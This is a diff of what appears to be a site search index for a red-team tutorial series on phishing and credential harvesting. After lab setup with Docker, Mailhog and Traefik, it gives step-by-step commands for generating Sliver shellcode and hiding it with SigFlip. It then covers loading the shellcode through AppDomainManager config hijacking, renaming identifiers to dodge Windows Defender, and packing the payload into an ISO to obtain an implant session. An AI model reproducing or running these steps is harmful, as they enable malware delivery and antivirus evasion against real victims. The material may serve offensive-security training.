@@ -14,7 +14,9 @@ sudo apt install golang go install github.com/defektive/docker-dnsmasq@latest No
 sudo ~/go/bin/docker-dnsmasq daemon We can test everything is working properly by starting a container with the VIRTUAL_HOST environment variable. Then pinging that docker container VIRTUAL_HOST name.
 ping mailhog.docker We should also be able to ping random subdomains:
 ping asdasd.mailhog.docker Windows VM We’ll want a Windows box to do a little bit of payload development and testing. Once windows is installed, we’ll need to install Visual Studio Community. When configuring visual studio select .NET Development.
-TODO: Screenshots
+https://learn.microsoft.com/en-us/dotnet/framework/install/dotnet-35-windows#enable-the-net-framework-35-in-control-panel
+Change networking to bridged We need to change our VM’s network settings to be bridge so they can talk to each other.
+Install Guest Utils We should install virtualbox guest utils. This will make things much easier when we want to share things between our VMs.
 `,description:"",tags:null,title:"Infrastructure",uri:"/how_to/phishing-credential-harvesting-and-beyond/20-infrastructure/index.html"},{content:`We need a nice place to organize and store everything. For this exercise, we’ll use ~/Desktop/op. We’ll also need a docker directory to put our docker configuration in.
 mkdir -p ~/Desktop/op/docker touch ~/Desktop/op/docker/docker-compose.yml `,description:"",tags:null,title:"Setup Operations Directory",uri:"/how_to/phishing-credential-harvesting-and-beyond/23-setup-op-dir/index.html"},{content:`Mailhog is an SMTP server used for testing various applications that send emails. It provides a simple web interface to view what messages have been sent. Let’s edit our new ~/Desktop/op/docker/docker-compose.yml file and add the following to configure Mailhog.
 version: "3" services: mailhog: image: mailhog/mailhog container_name: mailhog environment: - VIRTUAL_HOST=mailhog.docker logging: driver: 'none' # disable saving logs Now we should be able to bring up our docker compose environment to test that it is working.
@@ -88,12 +90,11 @@ sudo docker compose up Now we can use our new traefik URL as our Gophish URL in 
 `,description:"",tags:null,title:"Traefik Reverse Proxy",uri:"/how_to/phishing-credential-harvesting-and-beyond/95-traefik-reverse-proxy/index.html"},{content:`Better implants (frostbyte bypass windows defender) Instead of generating a executable. We can generate shellcode. We can then use something like https://github.com/pwn1sher/frostbyte to load that shellcode into memory and execute it.
 Lets get download the frostbyte zip from Github. Extract it to the desktop.
 We need a .net binary with a .exe.config file. Windows has lots of those in C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319.
-Generate shellcode
-./SigFlip.exe -i "C:\\Users\\Administrator\\Desktop\\frostbyte-main\\jsc.exe" "C:\\Users\\Administrator\\Desktop\\frostbyte-main\\beacon64.bin" "C:\\Users\\Administrator\\Desktop\\frostbyte-main\\test.exe" "secret" We need to update the config file and replace the values of update and A54IPK. We also need to update privatePath to be a relative path .
-open test.cs in visual studio. change the value of A54IPK
-byte[] _peBlob = Read("test.exe"); byte[] _data = Decrypt(shellcode, "secret"); build ….
-We’ll also want to change some of the code to be a little different
-C:\\windows\\Microsoft.NET\\Framework\\v3.5\\csc.exe /target:library /out:test.dll ..\\frostbyte-main\\test.cs test ….
+Generate shellcode In a sliver shell we need to run the following be sure to replace the ip with your vm’s ip.
+generate --mtls replaceip -f shellcode --save implants/shellcodex64.bin Copy the shellcode to your windows machine.
+SigFlip.exe -i "C:\\Users\\testuser\\Desktop\\frostbyte-main\\jsc.exe" "C:\\Users\\testuser\\Desktop\\frostbyte-main\\shellcodex64.bin" "C:\\Users\\testuser\\Desktop\\frostbyte-main\\AuthHelper.exe" "iamadumbsecret" We need to replace test with our executabe name our executable name without the extenaion (AuthHelper). Next we need to update the value of appDomainManagerType to be something else NewAuthHelper. Finally lets make privatePath a relative path . save as AuthHelper.exe.config \u003cconfiguration\u003e \u003cruntime\u003e \u003cassemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1"\u003e \u003cprobing privatePath="."/\u003e \u003c/assemblyBinding\u003e \u003cappDomainManagerAssembly value="AuthHelper, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" /\u003e \u003cappDomainManagerType value="NewAuthHelper" /\u003e \u003c/runtime\u003e \u003c/configuration\u003e Now we need to update the test.cs file.
+remove top three lines prepended with # replace Z45UDG with NewAuthHelper comment out logging replace S3cretK3y with iamadumbsecret change Z:\\\\zloader\\\\update.exe to AuthHelper.exe replace all instances of shellcode with pizza replace ClassExample with WeatherChecker replace Beacon with Forecast replace Decrypt with Process We’ll also want to change some of the code to be a little different
+C:\\windows\\Microsoft.NET\\Framework\\v3.5\\csc.exe /target:library /out:AuthHelper.dll test.cs test ….
 PackMyPayload https://github.com/mgeeky/PackMyPayload
 Create a new folder and andd your files (.dll, .exe, .exe.config)
 ./PackMyPayload.py --hide test.dll,test.exe.config foldername isoname.iso -v now we should be able to mount the iso and run our exe to get an implant session.
